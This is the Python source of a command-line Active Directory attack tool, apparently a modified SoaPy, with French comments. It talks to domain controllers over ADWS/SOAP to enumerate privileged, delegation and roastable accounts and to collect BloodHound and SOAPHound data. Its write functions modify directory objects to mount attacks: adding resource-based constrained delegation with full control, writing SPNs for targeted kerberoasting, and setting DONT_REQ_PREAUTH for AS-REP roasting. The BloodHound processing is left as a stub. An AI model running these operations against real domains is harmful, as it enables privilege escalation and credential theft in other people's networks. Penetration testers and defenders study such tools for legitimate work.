import argparse
import logging
import sys
import json
import io
import unicodedata
# Import du nouveau module
from .cache_gen import generate_soaphound_caches, combine_generated_caches # MODIFIÉ: Import spécifique
from base64 import b64decode, b64encode # Ajout de b64encode
from uuid import UUID

# Importations spécifiques à impacket et ADWS
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE,
    ACCESS_MASK,
    ACE,
    ACL,
    LDAP_SID,
    SR_SECURITY_DESCRIPTOR,
)
from src.adws import ADWSConnect, NTLMAuth # Assurez-vous que ces modules src.* sont accessibles
from src.soap_templates import NAMESPACES   # Assurez-vous que ces modules src.* sont accessibles


# --- Existing Utility Functions (These remain unchanged unless you need to update them) ---
# ... (les fonctions _create_empty_sd, _create_allow_ace, getAccountDN, set_spn, set_asrep, set_rbcd restent ici, inchangées) ...
def _create_empty_sd():
    """Creates an empty security descriptor for update operations."""
    sd = SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = LDAP_SID()
    sd["OwnerSid"].fromCanonical("S-1-5-32-544") # BUILTIN\Administrators
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd

def _create_allow_ace(sid: LDAP_SID):
    """Creates an ACCESS_ALLOWED ACE for adding to a security descriptor."""
    nace = ACE()
    nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
    nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE()
    acedata["Mask"] = ACCESS_MASK()
    acedata["Mask"]["Mask"] = 983551  # Full control
    acedata["Sid"] = sid.getData()
    nace["Ace"] = acedata
    return nace

def getAccountDN(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: NTLMAuth,
):
    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    attributes: list = ["distinguishedname"]
    pull_et = pull_client.pull(query=get_account_query, attributes=attributes)
    dn = None
    for item in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
        distinguishedName_elem = item.find(
            ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
        )
        if distinguishedName_elem is not None and distinguishedName_elem.text is not None:
            dn = distinguishedName_elem.text
            break
    if dn is None:
        logging.critical(f"Unable to find distinguishedName for target: {target}")
        sys.exit(1)
    return dn

def set_spn(
    target: str, value: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False,
):
    dn = getAccountDN(target=target,username=username,ip=ip,domain=domain,auth=auth)
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    put_client.put(
        object_ref=dn, operation="add" if not remove else "delete",
        attribute="addata:servicePrincipalName", data_type="string", value=value,
    )
    print(f"[+] servicePrincipalName {value} {'removed' if remove else 'written'} successfully on {target}!")

def set_asrep(
    target: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False,
):
    get_accounts_queries = f"(sAMAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    attributes: list = ["userAccountControl", "distinguishedName"]
    pull_et = pull_client.pull(query=get_accounts_queries, attributes=attributes)
    uac_val_text = None
    dn = None
    for item in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
        uac_elem = item.find(".//addata:userAccountControl/ad:value",namespaces=NAMESPACES)
        distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
        if uac_elem is not None and uac_elem.text is not None: uac_val_text = uac_elem.text
        if distinguishedName_elem is not None and distinguishedName_elem.text is not None: dn = distinguishedName_elem.text
        if uac_val_text and dn: break
    
    if dn is None or uac_val_text is None:
        logging.critical(f"Unable to find userAccountControl or distinguishedName for target: {target}")
        sys.exit(1)
    uac_val = int(uac_val_text)
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    newUac = uac_val | 0x400000 if not remove else uac_val & ~0x400000
    put_client.put(object_ref=dn, operation="replace", attribute="addata:userAccountControl", data_type="string", value=str(newUac))
    print(f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully!")

def set_rbcd(
    target: str, account: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False,
):
    get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    attributes: list = ["samaccountname", "objectsid", "distinguishedname", "msds-allowedtoactonbehalfofotheridentity"]
    pull_et = pull_client.pull(query=get_accounts_queries, attributes=attributes)
    target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd()
    target_dn: str = ""
    account_sid_obj: LDAP_SID | None = None
    for item in pull_et.findall(".//addata:computer", namespaces=NAMESPACES): # Assumes target/account are computers
        sam_name_elem = item.find(".//addata:sAMAccountName/ad:value", namespaces=NAMESPACES)
        sd_elem = item.find(".//addata:msDS-AllowedToActOnBehalfOfOtherIdentity/ad:value", namespaces=NAMESPACES)
        sid_elem = item.find(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
        sam_name = sam_name_elem.text if sam_name_elem is not None else ""
        sid_b64 = sid_elem.text if sid_elem is not None else ""
        sd_b64 = sd_elem.text if sd_elem is not None else ""
        dn_val = distinguishedName_elem.text if distinguishedName_elem is not None else ""
        if sam_name and sid_b64 and sam_name.casefold() == account.casefold():
            try: account_sid_obj = LDAP_SID(data=b64decode(sid_b64))
            except Exception as e: logging.error(f"Error decoding SID for {account}: {e}")
        if dn_val and sam_name and sam_name.casefold() == target.casefold():
            target_dn = dn_val
            if sd_b64:
                try: target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd_b64))
                except Exception as e: logging.error(f"Error decoding SD for {target}: {e}")
    if not account_sid_obj: logging.critical(f"Unable to find/decode SID for {account} or {target}"); sys.exit(1)
    target_sd["Dacl"].aces = [ace for ace in target_sd["Dacl"].aces if ace["Ace"]["Sid"].formatCanonical() != account_sid_obj.formatCanonical()]
    if not remove: target_sd["Dacl"].aces.append(_create_allow_ace(account_sid_obj))
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    encoded_sd = b64encode(target_sd.getData()).decode("utf-8")
    put_client.put(object_ref=target_dn, operation="replace", attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity", data_type="base64Binary", value=encoded_sd)
    if remove and len(target_sd["Dacl"].aces) == 0:
        put_client.put(object_ref=target_dn, operation="delete", attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity", data_type="base64Binary", value=encoded_sd)
    print(f"[+] msDS-AllowedToActOnBehalfOfIdentity {'removed' if remove else 'written'} successfully!")
    print(f"[+] {account} {'can not' if remove else 'can'} delegate to {target}")


def run_cli():
    print("""
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝
███████║╚██████╔╝██║  ██║██║        ██║
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ██║1.1
    """)

    parser = argparse.ArgumentParser(
        add_help=True,
        description="Enumerate and write LDAP objects over ADWS using the SOAP protocol",
    )
    parser.add_argument(
        "connection",
        action="store",
        help="domain/username[:password]@<targetName or address>",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Turn DEBUG output ON"
    )
    parser.add_argument(
        "--ts",
        action="store_true",
        help="Adds timestamp to every logging output."
    )
    parser.add_argument(
        "--hash",
        action="store",
        metavar="nthash",
        help="Use an NT hash for authentication",
    )

    enum = parser.add_argument_group('Enumeration')
    enum.add_argument(
        "--users",
        action="store_true",
        help="Enumerate user objects"
    )
    enum.add_argument(
        "--computers",
        action="store_true",
        help="Enumerate computer objects"
    )

    enum.add_argument(
        "--cache",
        action="store_true",
        help="Create SOAPHound compatible cache files (IdToTypeCache.json, ValueToIdCache.json, CombinedCache.json)" # Updated help text
    )

    enum.add_argument(
        "--bloodhound",
        action="store_true",
        help="Collect AD objects for Bloodhound" # Ce flag sera utilisé pour décider du traitement des données
    )

    enum.add_argument(
        "--groups",
        action="store_true",
        help="Enumerate group objects"
    )
    # ... (autres arguments d'énumération inchangés) ...
    enum.add_argument(
        "--constrained", action="store_true",
        help="Enumerate objects with the msDS-AllowedToDelegateTo attribute set",
    )
    enum.add_argument(
        "--unconstrained", action="store_true",
        help="Enumerate objects with the TRUSTED_FOR_DELEGATION flag set",
    )
    enum.add_argument(
        "--spns", action="store_true",
        help="Enumerate accounts with the servicePrincipalName attribute set"
    )
    enum.add_argument(
        "--asreproastable", action="store_true",
        help="Enumerate accounts with the DONT_REQ_PREAUTH flag set"
    )
    enum.add_argument(
        "--admins", action="store_true",
        help="Enumerate high privilege accounts"
    )
    enum.add_argument(
        "--rbcds", action="store_true",
        help="Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set"
    )
    enum.add_argument(
        "-q", "--query", action="store", metavar="query",
        help="Raw query to execute on the target",
    )
    enum.add_argument(
        "--filter", action="store", metavar="attr,attr,...",
        help="Attributes to select from the objects returned, in a comma seperated list",
    )


    writing = parser.add_argument_group('Writing')
    # ... (arguments d'écriture inchangés) ...
    writing.add_argument(
        "--rbcd", action="store", metavar="source",
        help="Operation to write or remove RBCD. Also used to pass in the source computer account used for the attack.",
    )
    writing.add_argument(
        "--spn", action="store", metavar="value",
        help='Operation to write the servicePrincipalName attribute value, writes by default unless "--remove" is specified',
    )
    writing.add_argument(
        "--asrep", action="store_true",
        help="Operation to write the DONT_REQ_PREAUTH (0x400000) userAccountControl flag on a target object"
    )
    writing.add_argument(
        "--account", action="store", metavar="account",
        help="Account to perform an operation on",
    )
    writing.add_argument(
        "--remove", action="store_true",
        help="Operation to remove an attribute value based off an operation",
    )


    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Initialisation du logger impacket (utilisé par script1, donc on le garde si script2 est similaire)
    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG) # S'applique au logger racine
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.connection)

    if domain is None: # parse_target peut retourner None pour le domaine
        domain = "" # Éviter l'erreur si le domaine n'est pas dans la chaîne de connexion

    if not password and username and not options.hash:
        from getpass import getpass
        password = getpass("Password:")

    queries: dict[str, str] = {
        "users": "(&(objectClass=user)(objectCategory=person))",
        "computers": "(objectClass=computer)",
        "constrained": "(msds-allowedtodelegateto=*)",
        "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        "spns": "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "asreproastable":"(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "admins": "(&(objectClass=user)(adminCount=1))",
        "groups": "(objectCategory=group)",
        "rbcds": "(msds-allowedtoactonbehalfofotheridentity=*)",
        "cache_or_bloodhound_base_query": "(objectClass=*)", # Requête large pour cache/BH
    }

    ldap_query_strings = [] # Renommé pour éviter la confusion avec options.query
    if options.query:
        ldap_query_strings.append(options.query)
    
    # Logique pour déterminer la requête principale et les attributs
    query_to_execute = None
    attributes_to_fetch = []

    # Gestion des opérations d'écriture en premier
    if options.rbcd is not None or options.spn is not None or options.asrep:
        if not domain: logging.critical('"domain" must be specified for write operations'); sys.exit(1)
        if not username: logging.critical('"username" must be specified for write operations'); sys.exit(1)
        auth = NTLMAuth(password=password, hashes=options.hash)
        if options.rbcd is not None:
            if not options.account: logging.critical('"--rbcd" must be used with "--account"'); sys.exit(1)
            set_rbcd(ip=remoteName, domain=domain, target=options.account, account=options.rbcd, username=username, auth=auth, remove=options.remove)
        elif options.spn is not None:
            if not options.account: logging.critical('Please specify an account with "--account"'); sys.exit(1)
            set_spn(ip=remoteName, domain=domain, target=options.account, value=options.spn, username=username, auth=auth, remove=options.remove)
        elif options.asrep:
            if not options.account: logging.critical('Please specify an account with "--account"'); sys.exit(1)
            set_asrep(ip=remoteName, domain=domain, target=options.account, username=username, auth=auth, remove=options.remove)
        sys.exit(0) # Quitter après une opération d'écriture

    # Logique pour --cache ou --bloodhound (qui nécessitent une collecte de données)
    elif options.cache or options.bloodhound:
        if not domain: logging.critical('"domain" must be specified for --cache or --bloodhound'); sys.exit(1)
        if not username: logging.critical('"username" must be specified for --cache or --bloodhound'); sys.exit(1)
        auth = NTLMAuth(password=password, hashes=options.hash)
        client = ADWSConnect.pull_client(ip=remoteName, domain=domain, username=username, auth=auth)
        
        query_to_execute = queries["cache_or_bloodhound_base_query"] # Requête large
        
        if options.bloodhound:
            attributes_to_fetch = [ # Liste d'attributs typique pour BloodHound
                "objectSid", "objectGUID", "distinguishedName", "sAMAccountName", "cn", "name",
                "objectClass", "primaryGroupID", "userAccountControl", "lastLogonTimestamp",
                "pwdLastSet", "lastLogon", "servicePrincipalName", "description", "operatingSystem",
                "sIDHistory", "nTSecurityDescriptor", "whenCreated", "displayName", "title",
                "homeDirectory", "scriptPath", "adminCount", "member", "memberOf",
                "msDS-Behavior-Version", "msDS-AllowedToDelegateTo", "msDS-AllowedToActOnBehalfOfOtherIdentity",
                "ms-MCS-AdmPwdExpirationTime", "gPCFileSysPath", "gPLink", "gPOptions",
                "dNSHostName"
            ]
            logging.info(f"Collecting data for BloodHound with query: {query_to_execute}")
        elif options.cache:
            attributes_to_fetch = ["objectSid", "objectGUID", "distinguishedName", "objectClass"] # Attributs pour le cache
            logging.info(f"Collecting data for Cache with query: {query_to_execute}")

        all_pulled_items = []
        logging.debug(f"Executing query: {query_to_execute} with attributes: {attributes_to_fetch}")
        pull_et = client.pull(query_to_execute, attributes_to_fetch)

        for item_xml in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
            obj_data = {}
            for attr_name in attributes_to_fetch:
                attr_values = []
                for val_elem in item_xml.findall(f".//addata:{attr_name}/ad:value", namespaces=NAMESPACES):
                    if val_elem.text is not None:
                        attr_values.append(val_elem.text)
                if attr_values:
                    obj_data[attr_name] = attr_values[0] if len(attr_values) == 1 else attr_values
            
            # S'assurer que distinguishedName, objectSid/objectGUID et objectClass sont présents
            if 'distinguishedName' not in obj_data:
                dn_elem = item_xml.findtext(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
                if dn_elem: obj_data['distinguishedName'] = dn_elem
            
            if 'objectSid' not in obj_data: # Nécessaire pour le cache
                sid_elem = item_xml.findtext(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
                if sid_elem: obj_data['objectSid'] = sid_elem
            
            if 'objectGUID' not in obj_data: # Nécessaire pour le cache
                guid_elem = item_xml.findtext(".//addata:objectGUID/ad:value", namespaces=NAMESPACES)
                if guid_elem: obj_data['objectGUID'] = guid_elem

            if 'objectClass' not in obj_data: # Nécessaire pour le cache
                obj_data['objectClass'] = [oc.text for oc in item_xml.findall(".//addata:objectClass/ad:value", namespaces=NAMESPACES) if oc.text]

            if obj_data.get('distinguishedName') and (obj_data.get('objectSid') or obj_data.get('objectGUID')):
                all_pulled_items.append(obj_data)
            else:
                logging.debug(f"Skipping object with missing critical info: {obj_data.get('distinguishedName')}")
        
        logging.info(f"Collected {len(all_pulled_items)} raw objects.")

        if options.cache:
            domain_root_dn = f"DC={domain.replace('.', ',DC=')}"
            logging.info(f"Generating SOAPHound cache files for domain root: {domain_root_dn}...")
            # --- MODIFICATION ICI ---
            id_to_type_cache_dict, value_to_id_cache_dict = generate_soaphound_caches(
                all_pulled_items, domain_root_dn, output_dir="." 
            )
            if id_to_type_cache_dict and value_to_id_cache_dict:
                combine_generated_caches(
                    id_to_type_cache_dict, 
                    value_to_id_cache_dict, 
                    output_path="CombinedCache.json"
                )
                logging.info("SOAPHound cache generation complete. Check IdToTypeCache.json, ValueToIdCache.json, and CombinedCache.json.")
            else:
                logging.error("Cache generation failed, CombinedCache.json not created.")
            # --- FIN DE LA MODIFICATION ---

        elif options.bloodhound:
            # Ici, vous appelleriez votre fonction de traitement pour BloodHound
            # Par exemple: process_bloodhound_json_data(all_pulled_items, domain)
            # Pour l'instant, on affiche un message.
            print(f"[*] Bloodhound data collected ({len(all_pulled_items)} objects). Processing would happen here.")
            logging.info("Bloodhound data collection ready for processing (processing function not yet called in this script).")
            # Note: Vous aurez besoin d'une fonction comme process_bloodhound_data(all_pulled_items, domain)
            # pour générer les fichiers users.json, computers.json etc.
            # Cette fonction devrait être dans cache_gen.py ou ici.

    # Logique pour les autres options d'énumération (si ni écriture, ni cache, ni bloodhound n'ont été exécutés)
    else:
        if not domain: logging.critical('"domain" must be specified'); sys.exit(1)
        if not username: logging.critical('"username" must be specified'); sys.exit(1)
        auth = NTLMAuth(password=password, hashes=options.hash)
        client = ADWSConnect.pull_client(ip=remoteName, domain=domain, username=username, auth=auth)

        # Déterminer la requête à exécuter
        final_query_list = []
        if options.query:
            final_query_list.append(options.query)
        else: # Construire la liste des requêtes à partir des flags
            for flag, query_str in queries.items():
                if getattr(options, flag, False) and flag not in ["cache", "bloodhound", "cache_or_bloodhound_base_query"]:
                    final_query_list.append(query_str)
        
        if not final_query_list:
            logging.info("No specific enumeration query or operation selected. Use --help for options.")
            sys.exit(0)

        # Déterminer les attributs pour l'énumération standard
        if options.filter:
            attributes_to_fetch = [x.strip() for x in options.filter.split(",")]
        else:
            attributes_to_fetch = ["sAMAccountName", "distinguishedName", "objectSid", "objectClass"] # Default for general enum

        total_found = 0
        for current_query in final_query_list:
            logging.info(f"Executing query: {current_query} with attributes: {attributes_to_fetch}")
            pull_et = client.pull(current_query, attributes_to_fetch)
            found_in_query = 0
            for item_xml in pull_et.findall(".//addata:*", namespaces=NAMESPACES):
                found_in_query +=1
                print("-" * 20)
                for attr_name in attributes_to_fetch:
                    attr_values = []
                    for val_elem in item_xml.findall(f".//addata:{attr_name}/ad:value", namespaces=NAMESPACES):
                        if val_elem.text is not None:
                            # Gérer le décodage Base64 pour SID et GUID si nécessaire
                                if attr_name in ["objectSid", "objectGUID"] and val_elem.text:
                                    try:
                                        decoded_val = b64decode(val_elem.text)
                                        if attr_name == "objectSid":
                                            attr_values.append(LDAP_SID(decoded_val).formatCanonical())
                                        elif attr_name == "objectGUID":
                                            attr_values.append(str(UUID(bytes_le=decoded_val)))
                                    except Exception as e: # Il est bon d'attraper l'exception ici
                                        attr_values.append(f"{val_elem.text} (b64 decode/format error: {e})")
                                else:
                                    attr_values.append(val_elem.text)
                    if attr_values:
                        print(f"  {attr_name}: {', '.join(attr_values)}")
            total_found += found_in_query
            logging.info(f"Query '{current_query}' found {found_in_query} objects.")
        logging.info(f"Total objects found across all queries: {total_found}")


if __name__ == "__main__":
    run_cli()